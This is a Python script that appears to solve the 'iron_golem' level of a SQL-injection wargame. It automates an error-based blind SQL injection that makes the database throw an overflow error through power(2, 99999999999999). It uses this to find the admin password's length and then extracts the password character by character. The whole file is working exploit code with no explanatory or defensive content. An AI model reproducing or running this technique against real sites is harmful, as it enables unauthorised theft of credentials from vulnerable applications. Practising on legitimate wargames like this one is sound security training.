import requests
import string

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookies = {"PHPSESSID": "cm1t0ihlf8scsk206gq4q10ert"}
ERROR_MESSAGE = "DOUBLE value is out of range in 'pow(2,99999999999999)'"
letters = string.printable

pwlen = 0
result = ""

for i in range(68, 100):
    req = requests.get(url+f"?pw=' or id='admin' and if((length(pw)={i}), power(2, 99999999999999), 0) -- ;", cookies=cookies)
    print(f"Finding.. {i}")

    if req.text.find(ERROR_MESSAGE) != -1:
        pwlen = i
        print(f"Password length is {pwlen}")
        break

for i in range(1, pwlen + 1):
    for j in range(0, 128):
        req = requests.get(url+f"?pw=' or id='admin' and if((ascii(substr(pw,{i},1))={j}), power(2, 99999999999999), 0) -- ;", cookies=cookies)
        print(f"Finding.. {j}")

        if req.text.find(ERROR_MESSAGE) != -1:
            result += chr(j)
            print(f"Find!! {result}")
            break

print(f"Password is {result}")

